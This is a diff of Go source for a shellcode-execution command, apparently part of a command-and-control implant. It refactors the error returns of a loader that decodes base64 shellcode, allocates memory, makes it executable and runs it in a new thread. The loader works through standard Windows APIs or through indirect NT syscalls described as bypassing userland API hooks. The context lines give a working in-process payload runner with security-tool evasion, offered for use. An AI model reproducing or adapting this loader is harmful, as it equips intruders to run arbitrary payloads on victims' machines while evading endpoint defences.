@@ -37,42 +37,22 @@ var (
 func (c *ExecuteShellcodeCommand) Execute(task structs.Task) structs.CommandResult {
 	var args executeShellcodeArgs
 	if task.Params == "" {
-		return structs.CommandResult{
-			Output:    "Error: shellcode_b64 parameter required",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: shellcode_b64 parameter required")
 	}
 	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error parsing parameters: %v", err)
 	}
 	if args.ShellcodeB64 == "" {
-		return structs.CommandResult{
-			Output:    "Error: shellcode_b64 is empty",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: shellcode_b64 is empty")
 	}
 
 	shellcode, err := base64.StdEncoding.DecodeString(args.ShellcodeB64)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error decoding shellcode: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error decoding shellcode: %v", err)
 	}
 
 	if len(shellcode) == 0 {
-		return structs.CommandResult{
-			Output:    "Error: shellcode is empty after decoding",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: shellcode is empty after decoding")
 	}
 
 	// Use indirect syscalls if available (bypasses userland API hooks)
@@ -91,11 +71,7 @@ func (c *ExecuteShellcodeCommand) executeStandard(shellcode []byte) structs.Comm
 		PAGE_READWRITE,
 	)
 	if addr == 0 {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: memory allocation failed: %v", lastErr),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error: memory allocation failed: %v", lastErr)
 	}
 
 	// Copy shellcode to allocated memory
@@ -111,11 +87,7 @@ func (c *ExecuteShellcodeCommand) executeStandard(shellcode []byte) structs.Comm
 		uintptr(unsafe.Pointer(&oldProtect)),
 	)
 	if ret == 0 {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: memory protection change failed: %v", lastErr),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error: memory protection change failed: %v", lastErr)
 	}
 
 	// Create thread to execute shellcode
@@ -128,20 +100,12 @@ func (c *ExecuteShellcodeCommand) executeStandard(shellcode []byte) structs.Comm
 		0,    // thread ID
 	)
 	if hThread == 0 {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: thread creation failed: %v", lastErr),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error: thread creation failed: %v", lastErr)
 	}
 
 	syscall.CloseHandle(syscall.Handle(hThread))
 
-	return structs.CommandResult{
-		Output:    fmt.Sprintf("Shellcode executed successfully\n  Size: %d bytes\n  Address: 0x%X\n  Method: Standard\n  Thread created and running", len(shellcode), addr),
-		Status:    "success",
-		Completed: true,
-	}
+	return successf("Shellcode executed successfully\n  Size: %d bytes\n  Address: 0x%X\n  Method: Standard\n  Thread created and running", len(shellcode), addr)
 }
 
 func (c *ExecuteShellcodeCommand) executeIndirect(shellcode []byte) structs.CommandResult {
@@ -153,11 +117,7 @@ func (c *ExecuteShellcodeCommand) executeIndirect(shellcode []byte) structs.Comm
 	status := IndirectNtAllocateVirtualMemory(currentProcess, &addr, &regionSize,
 		MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
 	if status != 0 {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: memory allocation failed: NTSTATUS 0x%X", status),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error: memory allocation failed: NTSTATUS 0x%X", status)
 	}
 
 	// Step 2: Copy shellcode (in-process, no API needed)
@@ -171,22 +131,14 @@ func (c *ExecuteShellcodeCommand) executeIndirect(shellcode []byte) structs.Comm
 	status = IndirectNtProtectVirtualMemory(currentProcess, &protectAddr, &protectSize,
 		PAGE_EXECUTE_READ, &oldProtect)
 	if status != 0 {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: memory protection change failed: NTSTATUS 0x%X", status),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error: memory protection change failed: NTSTATUS 0x%X", status)
 	}
 
 	// Step 4: Create thread via NtCreateThreadEx
 	var hThread uintptr
 	status = IndirectNtCreateThreadEx(&hThread, currentProcess, addr)
 	if status != 0 {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: thread creation failed: NTSTATUS 0x%X", status),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error: thread creation failed: NTSTATUS 0x%X", status)
 	}
 
 	syscall.CloseHandle(syscall.Handle(hThread))
